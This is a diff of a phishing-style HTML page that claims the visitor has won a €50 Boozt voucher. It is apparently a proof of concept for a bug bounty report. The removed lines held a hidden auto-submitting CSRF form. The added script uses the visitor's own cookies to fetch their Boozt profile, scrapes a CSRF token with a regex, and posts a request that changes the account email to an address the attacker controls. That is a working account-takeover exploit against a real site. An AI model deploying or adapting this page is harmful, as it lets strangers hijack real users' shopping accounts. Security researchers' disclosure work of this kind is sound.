@@ -9,15 +9,37 @@
     <h1>Congratulations!</h1>
     <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
 
-    <form id="exploit-form" action="https://www.boozt.com/eu/en/api/customer/profile/email/change" method="POST"
-        enctype="text/plain" style="display:none;">
-        <input type="hidden" name='{"email":"=", "email":"absolutexon+hellsp@wearehackerone.com"}' value=''>
-        <input type="submit" value="Claim">
-    </form>
-
     <script>
-        // Auto-submit the form - bypasses CORS
-        document.getElementById('exploit-form').submit();
+        // Step 1: Fetch the profile page to get a valid CSRF token
+        fetch('https://www.boozt.com/eu/en/customer/profile', {
+            credentials: 'include'
+        })
+            .then(response => response.text())
+            .then(html => {
+                // Extract CSRF token from the response (look for it in meta tags or script)
+                const tokenMatch = html.match(/csrf["\']?\s*:\s*["\']([a-f0-9]+)["\']/i) ||
+                    html.match(/token["\']?\s*["\']([a-f0-9]+)["\']/i);
+
+                if (tokenMatch && tokenMatch[1]) {
+                    const csrfToken = tokenMatch[1];
+                    console.log('Found CSRF token:', csrfToken);
+
+                    // Step 2: Make the email change request with the valid token
+                    return fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Requested-With': 'XMLHttpRequest',
+                            'Csrf-Token': csrfToken
+                        },
+                        credentials: 'include',
+                        body: JSON.stringify({ email: 'absolutexon+pwned@wearehackerone.com' })
+                    });
+                }
+            })
+            .then(response => response.json())
+            .then(data => console.log('Response:', data))
+            .catch(error => console.error('Error:', error));
     </script>
 </body>
 
